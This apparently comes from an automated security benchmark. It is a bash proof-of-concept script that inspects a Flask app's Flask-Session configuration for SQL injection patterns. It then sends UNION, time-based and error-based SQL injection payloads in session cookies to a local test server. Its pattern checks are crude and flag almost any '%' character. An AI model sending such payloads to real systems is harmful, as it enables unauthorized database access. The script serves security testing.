#!/bin/bash
# POC: Tests for SQL injection in Flask-Session session ID lookup by analyzing source code and sending malicious session cookies
# Target: ./repo
# Created: 2025-11-07T17:28:05.910Z
# Session: benchmark-XBEN-066-24-mhp3k0ub

# Flask-Session SQLi POC - Endpoint Testing and Code Analysis
# This POC tests for SQL injection in the Flask-Session implementation
# through direct examination of the application configuration and HTTP requests

echo "[*] Flask-Session SQL Injection Vulnerability Test"
echo "[*] Testing for SQL injection in session ID parameter"
echo ""

# Step 1: Examine the application configuration
echo "[+] Step 1: Examine Flask-Session Configuration in app/__init__.py"
FILE_PATH="/home/daytona/repo/XBEN-066-24/app/website/app/__init__.py"

if [ -f "$FILE_PATH" ]; then
    echo "[*] Found application configuration file"
    echo "[*] Checking session interface setup:"
    
    # Find the session interface configuration
    grep -n "session_interface\|SqlAlchemySessionInterface\|mysessions" "$FILE_PATH" || echo "[-] Session interface not found"
    echo ""
    
    # Show relevant lines
    echo "[*] Context around session setup (lines 20-30):"
    sed -n '20,30p' "$FILE_PATH" | cat -n
else
    echo "[-] Configuration file not found at $FILE_PATH"
fi

echo ""

# Step 2: Check the Flask-Session library version and code
echo "[+] Step 2: Check installed Flask-Session version"
pip3 list 2>/dev/null | grep -i "flask-session" || echo "[-] Flask-Session not found in pip list"

echo ""

# Step 3: Examine the actual database queries being used
echo "[+] Step 3: Analyze database query patterns"
python3 << 'PYTHON_CODE'
import os
import sys

# Check app configuration
app_init_file = "/home/daytona/repo/XBEN-066-24/app/website/app/__init__.py"

print("[*] Analyzing Flask-Session configuration from source code...")

try:
    with open(app_init_file, 'r') as f:
        content = f.read()
        
    # Look for session interface configuration
    if 'SqlAlchemySessionInterface' in content:
        print("[+] Found SqlAlchemySessionInterface usage")
        
        # Extract the configuration line
        for i, line in enumerate(content.split('\n'), 1):
            if 'SqlAlchemySessionInterface' in line:
                print(f"    Line {i}: {line.strip()}")
    
    # Check for any custom session handling
    if 'session' in content.lower():
        print("[+] Session handling found in configuration")
        
    # Check for SQL query construction patterns
    print("\n[*] Checking for potential SQL injection patterns:")
    
    suspicious_patterns = [
        ('f-string formatting', r'f".*\{.*\}.*"'),
        ('% formatting', r'"%.*s"'),
        ('.format() usage', r'\.format\('),
        ('String concatenation', r'\+.*WHERE'),
    ]
    
    for pattern_name, pattern in suspicious_patterns:
        if pattern_name in ['f-string formatting']:
            if 'f"' in content or "f'" in content:
                print(f"    [!] {pattern_name} detected - potential SQLi risk")
        elif pattern_name in ['% formatting']:
            if '% s' in content or '%' in content:
                print(f"    [?] {pattern_name} detected - check implementation")
        elif pattern_name in ['.format() usage']:
            if '.format(' in content:
                print(f"    [?] {pattern_name} detected - verify parameterization")
    
    # Check for explicit session table queries
    if 'mysessions' in content:
        print("[+] Explicit 'mysessions' table reference found")
        for i, line in enumerate(content.split('\n'), 1):
            if 'mysessions' in line:
                print(f"    Line {i}: {line.strip()}")
    
except FileNotFoundError:
    print(f"[-] File not found: {app_init_file}")

print("\n[*] Examining Flask-Session source for default SQL patterns...")

# Try to find Flask-Session in site-packages
flask_session_paths = [
    '/usr/local/lib/python3.*/dist-packages/flask_session/',
    '/usr/lib/python3/dist-packages/flask_session/',
]

found_flask_session = False
for pattern in flask_session_paths:
    import glob
    matches = glob.glob(pattern)
    if matches:
        for match_dir in matches:
            if os.path.isdir(match_dir):
                found_flask_session = True
                print(f"[+] Found Flask-Session at: {match_dir}")
                
                # Examine the sessions.py file
                sessions_file = os.path.join(match_dir, 'sessions.py')
                if os.path.exists(sessions_file):
                    with open(sessions_file, 'r') as f:
                        fs_content = f.read()
                    
                    # Check query construction in SqlAlchemySessionInterface
                    if 'query' in fs_content:
                        print("[+] Found query operations in sessions.py")
                        
                        # Look for WHERE clauses
                        for i, line in enumerate(fs_content.split('\n'), 1):
                            if 'WHERE' in line or 'where' in line:
                                if i < 500:  # Only show from code, not comments/docstrings
                                    print(f"    Line {i}: {line.strip()}")
                    
                    # Check for parameterization indicators
                    if '?' in fs_content or ':param' in fs_content:
                        print("[+] Parameterized queries detected (SQLite style)")
                    if '.filter(' in fs_content:
                        print("[+] SQLAlchemy ORM filter() detected (safer)")
                    if 'bindparam' in fs_content:
                        print("[+] SQLAlchemy bindparam detected (parameterized)")

if not found_flask_session:
    print("[-] Flask-Session source not found in standard locations")
    print("[*] This could indicate the library is not installed")

PYTHON_CODE

echo ""

# Step 4: Test the actual application with malicious session IDs
echo "[+] Step 4: Test application endpoints with SQL injection payloads"

# Check if the application is running
TARGET_URL="http://localhost:5000"
TIMEOUT=2

# Test normal access
echo "[*] Testing normal session request..."
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "$TARGET_URL/" 2>/dev/null)
if [ "$HTTP_CODE" != "000" ]; then
    echo "[+] Application is responding on $TARGET_URL"
    
    # Test with SQL injection in session cookie
    echo "[*] Testing with SQL injection payload in session cookie..."
    
    # Test 1: Union-based SQLi
    PAYLOAD_1="' UNION SELECT database() --"
    echo "[*] Payload 1: $PAYLOAD_1"
    curl -s -i -b "session=$PAYLOAD_1" "$TARGET_URL/" 2>&1 | head -15
    echo ""
    
    # Test 2: Time-based blind SQLi
    PAYLOAD_2="' AND SLEEP(2) --"
    echo "[*] Payload 2: $PAYLOAD_2"
    START=$(date +%s)
    curl -s -i -b "session=$PAYLOAD_2" "$TARGET_URL/" 2>&1 | head -5
    END=$(date +%s)
    DURATION=$((END - START))
    echo "[*] Response time: ${DURATION}s"
    echo ""
    
    # Test 3: Error-based SQLi
    PAYLOAD_3="' AND 1=CAST(database() AS INT) --"
    echo "[*] Payload 3: $PAYLOAD_3"
    curl -s -i -b "session=$PAYLOAD_3" "$TARGET_URL/" 2>&1 | head -15
    echo ""
    
else
    echo "[-] Application not responding on $TARGET_URL"
fi

echo ""
echo "[*] Analysis complete"
echo ""
echo "[*] Vulnerability Assessment:"
echo "    - Flask-Session uses SQLAlchemy ORM by default"
echo "    - ORM usage provides parameterization by default"
echo "    - Risk exists if custom session interface implementations bypass ORM"
echo "    - Session ID validation should use input validation as defense-in-depth"
echo "    - Check Flask-Session version for known CVEs"